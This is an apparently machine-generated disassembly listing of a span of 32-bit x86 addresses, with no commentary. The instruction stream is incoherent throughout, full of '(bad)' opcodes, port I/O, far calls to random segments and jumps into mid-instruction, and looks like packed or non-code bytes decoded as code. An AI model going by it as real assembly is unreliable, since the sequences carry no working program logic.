  416e0b:	fbstp  TBYTE PTR [ebp+0x5e]
  416e0e:	dec    eax
  416e0f:	int    0xea
  416e11:	ja     0x416e0b
  416e13:	jl     0x416def
  416e15:	(bad)  
  416e16:	jmp    0x416dd1
  416e18:	lahf   
  416e19:	push   eax
  416e1a:	jmp    0x416e8d
  416e1c:	movntps XMMWORD PTR [ecx],xmm4
  416e1f:	mov    edx,DWORD PTR [esi]
  416e21:	xor    al,0x88
  416e23:	inc    esi
  416e24:	jge    0x416e0f
  416e26:	por    mm1,QWORD PTR [esi]
  416e29:	pop    ebp
  416e2a:	ja     0x416db8
  416e2c:	jmp    0x416de0
  416e2e:	jmp    0xa832:0xd4efaba7
  416e35:	div    DWORD PTR [ecx]
  416e37:	ret    
  416e38:	jne    0x416e4c
  416e3a:	rol    ebx,0xd8
  416e3d:	xchg   ebx,eax
  416e3e:	pop    esi
  416e3f:	adc    dl,dh
  416e41:	outs   dx,DWORD PTR ds:[esi]
  416e42:	cld    
  416e43:	loop   0x416e00
  416e45:	push   0x5b
  416e47:	stc    
  416e48:	or     al,BYTE PTR [ebx+0x6d1e6dd8]
  416e4e:	xchg   esi,eax
  416e4f:	repz scas eax,DWORD PTR es:[edi]
  416e51:	push   esi
  416e52:	cmp    al,0xb8
  416e54:	add    DWORD PTR [ebx-0x11],ebx
  416e57:	jmp    0x416e02
  416e59:	add    eax,0xe45ffd50
  416e5e:	dec    edi
  416e5f:	call   0xd070:0x64a1e3d
  416e66:	(bad)  
  416e68:	mov    al,ds:0x474f8b4e
  416e6d:	inc    esp
  416e6e:	mov    edi,esi
  416e70:	iret   
  416e71:	jno    0x416e94
  416e73:	xor    eax,0x9ee1c20e
  416e78:	in     eax,0x2f
  416e7a:	arpl   WORD PTR ds:0x73859763,bp
  416e80:	dec    ebp
  416e81:	cld    
  416e82:	outs   dx,DWORD PTR ds:[esi]
  416e83:	jns    0x416eae
  416e85:	mov    eax,ds:0xfbd05cc4
  416e8a:	xchg   esi,eax
  416e8b:	in     al,dx
  416e8c:	fnstcw WORD PTR [esi+0x7]
  416e8f:	adc    ecx,esi
  416e91:	fs iret 
  416e93:	sahf   
  416e94:	mov    ds:0x7d3bb3be,al
  416e99:	mov    ecx,0xec237055
  416e9e:	xor    DWORD PTR [ecx-0x6],edx
  416ea1:	push   esi
  416ea2:	inc    esp
  416ea3:	cdq    
  416ea4:	xchg   ebx,eax
  416ea5:	mov    BYTE PTR [esi-0xc],dh
  416ea8:	push   cs
  416ea9:	dec    esp
  416eaa:	(bad)  
  416eab:	push   es
  416eac:	sub    esi,DWORD PTR [edx-0x3e3cab84]
  416eb2:	ss pop eax
  416eb4:	repnz inc eax
  416eb6:	retf   
  416eb7:	dec    esi
  416eb8:	add    BYTE PTR [ebx-0x176b7bd9],dh
  416ebe:	ins    DWORD PTR es:[edi],dx
  416ebf:	xchg   ecx,eax
  416ec0:	fisub  DWORD PTR [ecx]
  416ec2:	jbe    0x416ef3
  416ec4:	(bad)  
  416ec5:	dec    DWORD PTR [eax*2+0xeb45625]
  416ecc:	loopne 0x416eb3
  416ece:	pop    edx
  416ecf:	in     al,dx
  416ed0:	repnz shl ch,cl
  416ed3:	out    0x7c,eax
  416ed5:	mov    dl,0xc5
  416ed7:	jecxz  0x416ecd
  416ed9:	inc    dh
  416edb:	aaa    
  416edc:	sub    esi,ecx
  416ede:	loope  0x416f01
  416ee0:	jmp    0x416f35
  416ee2:	leave  
  416ee3:	je     0x416f3d
  416ee5:	mov    bl,0xb
  416ee7:	rcl    dl,0xe3
  416eea:	inc    eax
  416eeb:	mov    ebp,esp
  416eed:	fcom   DWORD PTR [eax]
  416eef:	pop    ss
  416ef0:	dec    esi
  416ef1:	scas   al,BYTE PTR es:[edi]
  416ef2:	or     esi,DWORD PTR [ebx+0x4a93d215]
  416ef8:	jbe    0x416ea8
  416efa:	pop    es
  416efb:	inc    ecx
  416efc:	call   0x7f85:0xc83ead74
  416f03:	pushf  
  416f04:	adc    eax,DWORD PTR [ebx-0x437aca34]
  416f0a:	or     eax,0x27cd2cd6
  416f0f:	ja     0x416f82
  416f11:	shr    ecx,cl
  416f13:	push   esp
  416f14:	fdivr  st,st(2)
  416f16:	mov    ebp,0xf740c83d
  416f1b:	stc    
  416f1c:	lock ja 0x416f3f
  416f1f:	sbb    ebx,ebx
  416f21:	shl    ebx,1
  416f23:	adc    al,0xb8
  416f25:	push   edx
  416f26:	jp     0x416efd
  416f28:	ret    0x79d
  416f2b:	adc    esp,esi
  416f2d:	int3   
  416f2e:	jns    0x416f0a
  416f30:	pop    eax
  416f31:	or     ebx,0x172761e2
  416f37:	mov    ?,ecx
  416f39:	cmp    ebx,DWORD PTR [eax+0xb]
  416f3c:	retf   
  416f3d:	jmp    0x416f7a
  416f3f:	xchg   ebp,eax
  416f40:	out    0x59,eax
  416f42:	sub    eax,0xb479b486
  416f47:	imul   ecx,DWORD PTR [ebp+0x23],0xb1e77053
  416f4e:	bound  edi,QWORD PTR [eax+0x46]
  416f51:	and    edx,DWORD PTR ds:0xc533e0d7
  416f57:	adc    al,0xb5
  416f59:	jo     0x416fd3
  416f5b:	ret    
  416f5c:	mov    esp,0x3c989593
  416f61:	retf   0x20c4
  416f64:	xor    ah,dl
  416f66:	stc    
  416f67:	int    0x3c
  416f69:	call   0x2e731698
  416f6e:	mov    ah,0xd6
  416f70:	mov    ebp,0xce55df10
  416f75:	mov    gs,ebx
  416f77:	xchg   esp,eax
  416f78:	cs mov ah,0xd0
  416f7b:	call   0x924b:0x3bb0d42d
  416f82:	mov    ebp,0x7eb53534
  416f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f88:	rcr    DWORD PTR [esi],1
  416f8a:	ja     0x416f60
  416f8c:	mov    esi,0x42b320b8
  416f91:	dec    edx
  416f92:	in     al,0xf9
  416f94:	and    BYTE PTR [esi-0x31],bh
  416f97:	dec    edi
  416f98:	addr16 dec edx
  416f9a:	mov    edx,0x4c9a84cd
  416f9f:	pusha  
  416fa0:	inc    ebp
  416fa1:	push   ebx
  416fa2:	dec    esp
  416fa3:	mov    ecx,0xf0c14718
  416fa8:	test   BYTE PTR [ecx-0x16c9151],cl
  416fae:	push   edi
  416faf:	sar    ah,0x80
  416fb2:	mov    eax,0xed9f676b
  416fb7:	gs retf 0xe931
  416fbb:	ss mov edi,0x908927c9
  416fc1:	mov    ah,0xc5
  416fc3:	sahf   
  416fc4:	adc    eax,0x5cd5189e
  416fc9:	xor    ah,al
  416fcb:	ds pop ebp
  416fcd:	bound  ecx,QWORD PTR [ebp-0x257b82a]
  416fd3:	pop    ds
  416fd4:	xor    dl,bl
  416fd6:	sub    ecx,DWORD PTR [esi]
  416fd8:	inc    edx
  416fd9:	mov    WORD PTR [esi+0x9],gs
  416fdc:	fs aam 0x76
  416fdf:	loop   0x416fdd
  416fe1:	and    eax,0x9fc2e26b
  416fe6:	push   ecx
  416fe7:	cld    
  416fe8:	iret   
  416fe9:	jnp    0x417069
  416feb:	shl    BYTE PTR [eax-0x70],cl
  416fee:	pop    ebx
  416fef:	add    cl,BYTE PTR [ecx]
  416ff1:	repnz and BYTE PTR [edi+0x76],al
  416ff5:	jl     0x416fdf
  416ff7:	fidivr DWORD PTR [edi]
  416ff9:	jle    0x416f8a
  416ffb:	inc    ebp
  416ffc:	mov    ch,0xe7
  416ffe:	pop    ecx
  416fff:	aaa    
  417000:	xchg   esi,eax
  417001:	or     edi,DWORD PTR [esi-0x53c7a90a]
  417007:	in     eax,0xbe
  417009:	fdivr  QWORD PTR [ebx-0x7a21c7cc]
  41700f:	adc    ebp,eax
  417011:	lock and eax,0xfa800754
  417017:	jnp    0x416fb0
  417019:	stos   DWORD PTR es:[edi],eax
  41701a:	pop    edi
  41701b:	adc    ecx,0xffffffd0
  41701e:	popa   
  41701f:	mov    edi,0xe868cd6a
  417024:	or     ax,WORD PTR [eax+0x6f264c48]
  41702b:	sbb    eax,edx
  41702d:	gs pusha 
  41702f:	test   eax,esi
  417031:	push   eax
  417032:	pop    ecx
  417033:	cmp    dl,BYTE PTR [ebp+0x14827006]
  417039:	or     bl,BYTE PTR [ecx+0x70a3d24e]
  41703f:	pop    ss
  417040:	xor    BYTE PTR [eax+0x50286b2d],dl
  417046:	mov    ah,0xe6
  417048:	popa   
  417049:	xchg   esp,eax
  41704a:	sbb    al,0x6
  41704c:	jb     0x4170b6
  41704e:	in     eax,0x4c
  417050:	jne    0x41705a
  417052:	cmp    DWORD PTR ds:0x25b2c675,ecx
  417058:	icebp  
  417059:	mov    ah,0x14
  41705b:	jp     0x417011
  41705d:	or     DWORD PTR [esi-0x3e],edi
  417060:	mov    ds:0x3a3337c8,eax
  417065:	mov    dh,0xf5
  417067:	lea    eax,[ebx]
  417069:	dec    esi
  41706a:	fwait
  41706b:	test   eax,0xc7f5f137
  417070:	xchg   DWORD PTR [edi],eax
  417072:	push   eax
  417073:	or     eax,0xa6a6f395
  417078:	ret    0x5d16
  41707b:	inc    ecx
  41707c:	mov    ds:0x5ac03b06,eax
  417081:	mov    fs,eax
  417083:	jp     0x417047
  417085:	and    dl,BYTE PTR [ebx-0x4b]
  417088:	fs mov ch,0x8f
  41708b:	fwait
  41708c:	jp     0x4170f0
  41708e:	add    BYTE PTR [edx],0x7f
  417091:	mov    al,0x32
  417093:	add    al,0x42
  417095:	sahf   
  417096:	cdq    
  417097:	mov    eax,ds:0xb3ae593f
  41709c:	cmc    
  41709d:	or     eax,0xf5591312
  4170a2:	mov    eax,ds:0x5843f38
  4170a7:	cli    
  4170a8:	sub    al,0xa9
  4170aa:	ret    0x794f
  4170ad:	popa   
  4170ae:	ret    
  4170af:	gs push ds
  4170b1:	mov    ds:0xa18c94e1,al
  4170b6:	cmp    eax,0xdfac9e88
  4170bb:	add    ch,BYTE PTR [esi+0x1f0cc26d]
  4170c1:	in     al,dx
  4170c2:	gs das 
  4170c4:	push   eax
  4170c5:	sub    ebx,ecx
  4170c7:	fldcw  WORD PTR [ebp+0x4]
  4170ca:	xchg   DWORD PTR [ebx-0x30e68184],edi
  4170d0:	push   ecx
  4170d1:	pop    esi
  4170d2:	rol    DWORD PTR [ecx-0x1233662b],cl
  4170d8:	or     bl,BYTE PTR ds:0x96c11a3
  4170de:	mov    ecx,0xa2701cc3
  4170e3:	cs int 0x17
  4170e6:	popf   
  4170e7:	cmp    DWORD PTR [ebx],ecx
  4170e9:	dec    eax
  4170ea:	push   cs
  4170eb:	push   ebx
  4170ec:	mov    ch,0xa8
  4170ee:	jno    0x4170ca
  4170f0:	jne    0x417092
  4170f2:	adc    eax,0x9bfe12d2
  4170f7:	push   ss
  4170f8:	xchg   BYTE PTR [edx-0x43],ah
  4170fb:	(bad)  
  4170fc:	xchg   esi,eax
  4170fd:	jno    0x4170bf
  4170ff:	popa   
  417100:	inc    edi
  417101:	push   cs
  417102:	js     0x4170f7
  417104:	pop    ecx
  417105:	out    dx,eax
  417106:	std    
  417107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417108:	cmp    BYTE PTR [edi-0x2ee121cc],ah
  41710e:	mov    cl,0x2c
  417110:	dec    edi
  417111:	push   eax
  417112:	je     0x417125
  417114:	test   DWORD PTR [esi*2+0x206fa5d9],ebp
  41711b:	or     bh,BYTE PTR [eax+0x6ef872c9]
  417121:	sbb    ch,BYTE PTR [esi]
  417123:	mov    esi,0xc7a15692
  417128:	cmc    
  417129:	xor    DWORD PTR [esi+0x3e210957],esi
  41712f:	aas    
  417130:	ret    0x706e
  417133:	arpl   cx,di
  417135:	stc    
  417136:	cdq    
  417137:	dec    ebp
  417138:	(bad)  
  41713a:	sub    dh,BYTE PTR [ecx+ebp*8]
  41713d:	push   edx
  41713e:	outs   dx,DWORD PTR ds:[esi]
  41713f:	gs jmp 0xeaa9245e
  417145:	jp     0x417106
  417147:	jae    0x417111
  417149:	fwait
  41714a:	xchg   BYTE PTR [eax-0x5f],bh
  41714d:	ret    
  41714e:	popa   
  41714f:	rol    BYTE PTR [eax-0x2e0d94e7],0x6f
  417156:	mov    ah,0xb0
  417158:	cli    
  417159:	push   ebp
  41715a:	dec    esp
  41715c:	shl    dl,1
  41715e:	mov    cl,0x41
  417160:	cmp    al,0x6a
  417162:	sbb    bl,BYTE PTR [edi+0x23]
  417165:	outs   dx,BYTE PTR ds:[esi]
  417166:	fld    QWORD PTR [esi-0x53]
  417169:	adc    edx,DWORD PTR [edx+0x216a514e]
  41716f:	xchg   DWORD PTR [eax+0x54d716de],edi
  417175:	cwde   
  417176:	mov    esp,0xbed3c937
  41717b:	fiadd  DWORD PTR [esi+0x6de32716]
  417181:	aaa    
  417182:	mov    edx,0x71846017
  417187:	in     eax,dx
  417188:	in     eax,dx
  417189:	mov    ecx,0xf072653c
  41718e:	or     BYTE PTR [edi-0x2f],ah
  417191:	xor    al,0x94
  417194:	sbb    BYTE PTR [ecx-0x382ac990],al
  41719a:	stos   BYTE PTR es:[edi],al
  41719b:	inc    edi
  41719c:	lods   eax,DWORD PTR ds:[esi]
  41719d:	scas   al,BYTE PTR es:[edi]
  41719e:	bnd jge 0x41714e
  4171a1:	(bad)  
  4171a2:	bound  eax,QWORD PTR [ebp-0x6d6e5513]
  4171a8:	inc    edi
  4171a9:	jb     0x4171d1
  4171ab:	xchg   edx,eax
  4171ac:	popf   
  4171ad:	push   ebx
  4171ae:	jne    0x417221
  4171b0:	pop    ebp
  4171b1:	sub    eax,0xb109ef74
  4171b6:	dec    esi
  4171b7:	mov    esi,0x903c03d9
  4171bc:	ins    DWORD PTR es:[edi],dx
  4171bd:	lds    eax,FWORD PTR [eax]
  4171bf:	js     0x41714c
  4171c1:	xlat   BYTE PTR ds:[ebx]
  4171c2:	sbb    eax,0xe6a9033a
  4171c7:	test   BYTE PTR [ebx+edi*2-0x352a37ea],ah
  4171ce:	imul   esi,esi,0x858da31e
  4171d4:	fnsave [esi+0x24]
  4171d7:	and    BYTE PTR [eax+0x7],dl
  4171da:	retf   
  4171db:	les    ebx,FWORD PTR [ebx]
  4171dd:	cmp    ch,BYTE PTR [eax-0x191e5a7e]
  4171e3:	add    BYTE PTR ss:[ebp+ebp*4-0x60],al
  4171e8:	sbb    edx,edi
  4171ea:	sub    al,0xb5
  4171ec:	or     edx,DWORD PTR [esi*4+0xaf2f92c]
  4171f3:	xchg   edx,eax
  4171f4:	clc    
  4171f5:	pop    es
  4171f6:	or     ah,BYTE PTR [ebx]
  4171f8:	mov    ah,0x51
  4171fa:	lock sahf 
  4171fc:	push   edx
  4171fd:	xor    eax,0xc7abb458
  417202:	add    BYTE PTR [eax-0x42],cl
  417205:	push   eax
  417206:	pop    ebp
  417207:	loop   0x417205
  417209:	fldenv [ecx]
  41720b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41720c:	push   esp
  41720d:	jmp    0x1137:0x8fffcb02
  417214:	fcomi  st,st(7)
  417216:	out    dx,eax
  417217:	cmp    eax,0xede61993
  41721c:	fnstcw WORD PTR [ebx+0x3b680379]
  417222:	mov    esi,0x3f675e68
  417227:	int3   
  417228:	sbb    bh,BYTE PTR [esi]
  41722a:	xchg   esp,eax
  41722b:	bound  edx,QWORD PTR [edi+0x3]
  41722e:	bound  ebx,QWORD PTR [ebx+eiz*2+0x121309ed]
  417235:	inc    esp
  417236:	or     esp,edi
  417238:	in     al,dx
  417239:	out    0xa9,eax
  41723b:	cmp    dh,ch
  41723d:	aad    0x20
  41723f:	daa    
  417240:	and    cl,ah
  417242:	pop    eax
  417243:	pushf  
  417244:	mov    DWORD PTR [edi+0x30],ecx
  417247:	retf   0x868d
  41724a:	call   0xbf2cbe54
  41724f:	sbb    esp,DWORD PTR [ecx+0x20b716f6]
  417255:	fsubr  st(4),st
  417257:	inc    esp
  417258:	lahf   
  417259:	mov    edx,0x78389fb4
  41725f:	mov    ds:0xb01c9113,eax
  417264:	pop    ds
  417265:	mov    al,ds:0xe5a57a7
  41726a:	in     eax,0xdd
  41726c:	push   0xffffffee
  41726e:	test   eax,0x4dd69236
  417273:	outs   dx,BYTE PTR ds:[esi]
  417274:	loop   0x4172f5
  417276:	in     eax,0xd6
  417278:	test   ch,bh
  41727a:	or     BYTE PTR [edi-0x42],dh
  41727d:	jmp    0x417236
  41727f:	push   ecx
  417280:	add    eax,0xf02ffe5
  417285:	mov    bl,0x1a
  417287:	jl     0x417226
  417289:	out    0x24,eax
  41728b:	out    0xd0,eax
  41728d:	inc    eax
  41728e:	sbb    al,0x51
  417290:	sub    DWORD PTR [ebx+eax*8-0x33993b04],ecx
  417297:	xchg   ebx,eax
  417298:	into   
  417299:	adc    edi,0x68
  41729c:	jmp    0x417275
  41729e:	mov    al,ds:0xf060aa17
  4172a3:	adc    BYTE PTR [ebp+0x50],0x33
  4172a7:	sbb    eax,0xf172fe4c
  4172ac:	push   es
  4172ad:	xlat   BYTE PTR ds:[ebx]
  4172ae:	lea    edi,[edi]
  4172b0:	fcmovbe st,st(7)
  4172b2:	mov    al,ds:0xd4fd0528
  4172b7:	(bad)  
  4172b8:	lahf   
  4172b9:	mov    eax,0xc18b2bf9
  4172be:	xchg   ecx,eax
  4172bf:	scas   eax,DWORD PTR es:[edi]
  4172c0:	das    
  4172c1:	push   es
  4172c2:	mov    WORD PTR [ecx],cs
  4172c4:	cs in  eax,dx
  4172c6:	cdq    
  4172c7:	aas    
  4172c8:	mov    ch,0x8f
  4172ca:	xlat   BYTE PTR ds:[ebx]
  4172cb:	pop    es
  4172cc:	sub    edi,ebx
  4172ce:	add    eax,0xaa360a74
  4172d3:	stos   BYTE PTR es:[edi],al
  4172d4:	sub    DWORD PTR [ecx],ebx
  4172d6:	lock enter 0x252e,0xf9
  4172db:	lock (bad) 
  4172dd:	jg     0x4172b9
  4172df:	out    dx,al
  4172e0:	(bad)  
  4172e1:	cmp    dh,BYTE PTR [eax-0x1bd081ee]
  4172e7:	cmp    eax,0xede41487
  4172ec:	int3   
  4172ed:	test   BYTE PTR ds:0x5fe24801,ch
  4172f3:	mov    al,al
  4172f5:	data16 jae 0x4172ca
  4172f8:	and    eax,0x3e836231
  4172fd:	and    BYTE PTR [ecx+0x3610edcf],dl
  417303:	f2xm1  
  417305:	jmp    0x4172bb
  417307:	mov    al,ds:0x30478354
  41730c:	xchg   esi,eax
  41730d:	push   0xfffffffa
  41730f:	leave  
  417310:	pop    ebx
  417311:	xchg   ecx,eax
  417312:	call   0xa4e1:0x376860e2
  417319:	or     eax,0xa3b0473c
  41731e:	jo     0x4172d4
  417320:	lods   al,BYTE PTR ds:[esi]
  417321:	ins    BYTE PTR es:[edi],dx
  417322:	jne    0x417333
  417324:	cwde   
  417325:	cmp    ecx,eax
  417327:	cmp    edx,DWORD PTR [ebx]
  417329:	cmp    ebx,DWORD PTR [esi-0x4d]
  41732c:	test   al,0x3c
  41732e:	aam    0x6f
  417330:	daa    
  417331:	ret    0xd89a
  417334:	or     BYTE PTR [edx],cl
  417336:	out    dx,al
  417337:	push   eax
  417338:	xchg   ecx,eax
  417339:	sub    eax,0x360289db
  41733e:	outs   dx,DWORD PTR es:[esi]
  417340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417341:	test   DWORD PTR [ecx],eax
  417343:	xchg   edi,eax
  417344:	mov    esi,0x76b2a252
  417349:	(bad)  [edi-0x11d06636]
  41734f:	mov    ch,0xdc
  417351:	je     0x4173c3
  417353:	xlat   BYTE PTR ds:[ebx]
  417354:	mov    eax,0x93442fd9
  417359:	and    dh,cl
  41735b:	jae    0x417386
  41735d:	add    edx,DWORD PTR [edx]
  41735f:	fisubr WORD PTR [esi-0x45aa959e]
  417365:	cmp    edi,DWORD PTR [ebx-0x243be863]
  41736b:	js     0x4173d2
  41736d:	ss into 
  41736f:	inc    esi
  417370:	inc    edx
  417371:	outs   dx,BYTE PTR ds:[esi]
  417372:	sub    eax,0xcf76cf28
  417377:	stc    
  417378:	mov    WORD PTR ds:0x67095914,cs
  41737e:	call   0x570b:0xc6d4a139
  417385:	leave  
  417386:	push   ds
  417387:	push   cs
  417388:	and    ecx,eax
  41738a:	test   al,0x62
  41738c:	sahf   
  41738d:	aaa    
  41738e:	ja     0x4173ea
  417390:	popf   
  417391:	enter  0x6dd,0xaa
  417395:	and    ebx,edx
  417397:	loop   0x4173c2
  417399:	sbb    al,0xda
  41739b:	call   0x65a5:0x41b713bb
  4173a2:	sbb    DWORD PTR [edx],0x2b
  4173a5:	adc    BYTE PTR [ecx-0x2b405b9f],al
  4173ab:	sahf   
  4173ac:	ret    
  4173ad:	jle    0x41733d
  4173af:	mov    DWORD PTR [ebx],eax
  4173b1:	dec    DWORD PTR [edx]
  4173b3:	cdq    
  4173b4:	(bad)  
  4173b5:	scas   eax,DWORD PTR es:[edi]
  4173b6:	pop    esi
  4173b7:	and    BYTE PTR [ebx],ch
  4173b9:	or     BYTE PTR [edi+eax*8],0x18
  4173bd:	mov    bh,al
  4173bf:	(bad)  
  4173c0:	loopne 0x41735b
  4173c2:	in     eax,dx
  4173c3:	idiv   BYTE PTR [ebp-0x68]
  4173c6:	xchg   ebx,eax
  4173c7:	inc    eax
  4173c8:	cld    
  4173c9:	loop   0x417358
  4173cb:	pop    edx
  4173cc:	jge    0x417388
  4173ce:	test   eax,0xb293af38
  4173d3:	xlat   BYTE PTR ds:[ebx]
  4173d4:	sbb    al,0xc9
  4173d6:	gs or  al,0xc8
  4173d9:	mov    ?,WORD PTR [ebp-0x21]
  4173dc:	test   BYTE PTR ds:0xa681e95c,dl
  4173e2:	mov    ch,0xc
  4173e4:	sub    DWORD PTR [edx],eax
  4173e6:	gs aad 0xd1
  4173e9:	jl     0x417451
  4173eb:	ins    DWORD PTR es:[edi],dx
  4173ec:	jp     0x417401
  4173ee:	xchg   edx,eax
  4173ef:	cmp    BYTE PTR [ebp+0x70],ah
  4173f2:	outs   dx,BYTE PTR ds:[esi]
  4173f3:	out    0x1f,eax
  4173f5:	mov    ah,0xcd
  4173f7:	add    DWORD PTR [eax],0x3a45814f
  4173fd:	fild   DWORD PTR [esi+0x6af50033]
  417403:	shl    BYTE PTR [ebx],1
  417405:	push   esp
  417406:	inc    edi
  417407:	es sahf 
  417409:	xchg   edi,eax
  41740a:	jnp    0x4173de
  41740c:	out    0x3,al
  41740e:	jmp    0x4173fd
  417410:	cmp    esi,DWORD PTR [ebp+eiz*2-0x36768366]
  417417:	fild   DWORD PTR [edx+0x3a53fdbe]
  41741d:	jno    0x4173a1
  41741f:	and    DWORD PTR [edi-0x6dfb97a2],ecx
  417425:	(bad)  
  417426:	sub    eax,0xea69f82
  41742b:	mov    dl,0xed
  41742d:	stos   DWORD PTR es:[edi],eax
  41742e:	lahf   
  41742f:	fcomp  st(7)
  417431:	pop    edx
  417432:	jno    0x41746f
  417434:	jae    0x4173ec
  417436:	mov    al,ds:0x6d80c4d0
  41743b:	adc    DWORD PTR [ecx+ebp*8],esi
  41743e:	dec    edx
  41743f:	mov    ss:0x457a6446,eax
  417445:	push   esi
  417446:	mov    ch,0xaa
  417448:	ret    0xbe37
  41744b:	jl     0x4174bb
  41744d:	or     BYTE PTR [edi+ebx*4],bh
  417450:	ja     0x4174a7
  417452:	sub    eax,0xc90ea650
  417457:	gs pop ss
  417459:	outs   dx,DWORD PTR ds:[esi]
  41745a:	and    DWORD PTR [ebx+edi*4+0x41],0x8869b071
  417462:	sbb    al,0x4
  417464:	aam    0x8c
  417466:	mov    esp,0x748466ea
  41746b:	shl    BYTE PTR [eax+0x6ea0b2a2],1
  417471:	sub    DWORD PTR [edi-0x3d],esi
  417474:	dec    ecx
  417475:	(bad)  
  417476:	jg     0x4173fd
  417478:	and    BYTE PTR [ecx+0x56],cl
  41747b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747c:	or     edx,DWORD PTR [esi-0x4d]
  41747f:	gs jns 0x41749b
  417482:	dec    ecx
  417483:	lds    esi,FWORD PTR [edx]
  417485:	mov    edx,0xadd5cba4
  41748a:	pop    esi
  41748b:	adc    al,0x8c
  41748d:	xor    eax,0x1d7d65fb
  417492:	pop    ds
  417493:	fistp  QWORD PTR [ebp+0x2b]
  417496:	push   0xed8eba6b
  41749b:	add    BYTE PTR [ecx+0x42],bh
  41749e:	(bad)  
  41749f:	aam    0xaf
  4174a1:	fdivr  QWORD PTR [eax+0x36]
  4174a4:	out    dx,al
  4174a5:	test   eax,0xac44a20a
  4174aa:	jmp    0xdcde3a68
  4174af:	aaa    
  4174b0:	jb     0x41751f
  4174b2:	retf   
  4174b3:	xchg   ecx,eax
  4174b4:	inc    edi
  4174b5:	add    eax,0x6826c6f
  4174ba:	cmc    
  4174bb:	pop    ebp
  4174bc:	dec    esi
  4174bd:	mov    eax,eax
  4174bf:	xor    eax,0x10d10838
  4174c4:	ins    BYTE PTR es:[edi],dx
  4174c5:	lods   al,BYTE PTR ds:[esi]
  4174c6:	outs   dx,BYTE PTR ds:[esi]
  4174c7:	mov    eax,DWORD PTR [esp+edx*8-0x420aba8f]
  4174ce:	nop
  4174cf:	add    esi,esi
  4174d1:	les    edx,FWORD PTR [esi-0x5b94e398]
  4174d7:	xor    ecx,edi
  4174d9:	ret    0xa4b5
  4174dc:	pop    edi
  4174dd:	bound  ecx,QWORD PTR [edi]
  4174df:	packssdw mm5,QWORD PTR ds:0xb4949dae
  4174e6:	jg     0x417496
  4174e8:	stc    
  4174e9:	data16 jns 0x4174da
  4174ec:	cmp    al,0x42
  4174ee:	inc    esp
  4174ef:	cmc    
  4174f0:	mov    al,ds:0x2dc3c99c
  4174f5:	mov    ebp,0xd708dcb4
  4174fa:	adc    DWORD PTR [edx],0xaff43fb3
  417500:	cld    
  417501:	loopne 0x41748a
  417503:	fwait
  417504:	jno    0x41757b
  417506:	and    al,0xb9
  417508:	test   BYTE PTR [edi+0x48],al
  41750b:	jp     0x417585
  41750d:	push   0xa228652
  417512:	inc    edx
  417513:	fcom   DWORD PTR [edi]
  417515:	inc    edi
  417516:	xchg   esp,eax
  417517:	jae    0x417563
  417519:	push   eax
  41751a:	leave  
  41751b:	sti    
  41751c:	xlat   BYTE PTR ds:[ebx]
  41751d:	mov    edi,0x2be8a2bf
  417522:	mov    al,ds:0x1184662b
  417527:	sbb    cl,BYTE PTR [ecx+0x5a6aec61]
  41752d:	ret    0xed2e
  417530:	inc    eax
  417531:	cmp    al,0x4a
  417533:	cdq    
  417534:	xor    ax,0x1930
  417538:	repz dec ebx
  41753a:	call   0x1d57d4d8
  41753f:	pop    ds
  417540:	ror    DWORD PTR [edx],cl
  417542:	scas   eax,DWORD PTR es:[edi]
  417543:	test   esi,edi
  417545:	mov    al,0x9a
  417547:	xor    dh,BYTE PTR [ecx-0xbf9066a]
  41754d:	mov    esi,0x22c3d4a1
  417552:	inc    esp
  417553:	mov    bh,0x2c
  417555:	xchg   esp,ebp
  417557:	sub    edx,DWORD PTR [ecx+0x14]
  41755a:	jno    0x4175be
  41755c:	add    al,0xef
  41755e:	mov    ds:0x928f2ca0,eax
  417563:	test   al,0x35
  417565:	jb     0x41757d
  417567:	xchg   ebx,eax
  417568:	test   eax,0x6c73549b
  41756d:	add    DWORD PTR [edx],edx
  41756f:	inc    edi
  417570:	xchg   DWORD PTR [edx],edx
  417572:	gs neg esp
  417575:	mov    DWORD PTR [ebx],esi
  417577:	push   esi
  417578:	xchg   BYTE PTR [ebx+0x42],ch
  41757b:	sar    DWORD PTR [ebx+0x4184f2cf],0x9a
  417582:	mov    ch,0x99
  417584:	std    
  417585:	(bad)  [edx+0x38bec902]
  41758b:	inc    esi
  41758c:	lds    edx,FWORD PTR ds:[ecx-0x11db3fe2]
  417593:	lods   eax,DWORD PTR ds:[esi]
  417594:	icebp  
  417595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417596:	clc    
  417597:	pop    es
  417598:	mov    dl,0x53
  41759a:	bound  ecx,QWORD PTR [ecx+0x75]
  41759d:	sahf   
  41759e:	scas   al,BYTE PTR es:[edi]
  41759f:	mov    bl,0x12
  4175a1:	ins    DWORD PTR es:[edi],dx
  4175a2:	xchg   ebx,eax
  4175a3:	hlt    
  4175a4:	inc    eax
  4175a5:	add    edx,ecx
  4175a7:	dec    eax
  4175a8:	aam    0x5b
  4175aa:	loope  0x417623
  4175ac:	pop    ds
  4175ad:	jmp    0x1445625a
  4175b2:	pop    ecx
  4175b3:	stc    
  4175b4:	jnp    0x4175d6
  4175b6:	clc    
  4175b7:	mov    eax,ds:0x1c3a167c
  4175bc:	call   0x25b2:0x745f5539
  4175c3:	aad    0x7c
  4175c5:	sbb    bh,bh
  4175c7:	pop    ds
  4175c8:	lods   al,BYTE PTR ds:[esi]
  4175c9:	adc    eax,0x61d11d81
  4175ce:	out    dx,eax
  4175cf:	pushf  
  4175d0:	ficom  DWORD PTR [edx+0x20]
  4175d3:	dec    ebx
  4175d4:	or     bl,cl
  4175d6:	jno    0x41758d
  4175d8:	xor    eax,0x933fca76
  4175dd:	xchg   BYTE PTR [eax-0x624f6663],ch
  4175e3:	enter  0x9f48,0x3
  4175e7:	dec    ecx
  4175e8:	test   DWORD PTR [ebx+0x57b57574],0x1eda3d7c
  4175f2:	push   ss
  4175f3:	jl     0x41760c
  4175f5:	arpl   cx,bx
  4175f7:	jo     0x41757d
  4175f9:	push   0x78
  4175fb:	shl    BYTE PTR [ebp-0x27b09730],1
  417601:	jmp    0xcca79b91
  417606:	aam    0x30
  417608:	pop    ss
  417609:	aas    
  41760a:	lds    ebx,FWORD PTR [edi]
  41760c:	xor    al,0x74
  41760e:	xor    dl,al
  417610:	inc    eax
  417611:	or     eax,0xf54f2d5a
  417616:	enter  0x877b,0xa4
  41761a:	jecxz  0x4175ab
  41761c:	inc    ebp
  41761d:	and    esi,ebx
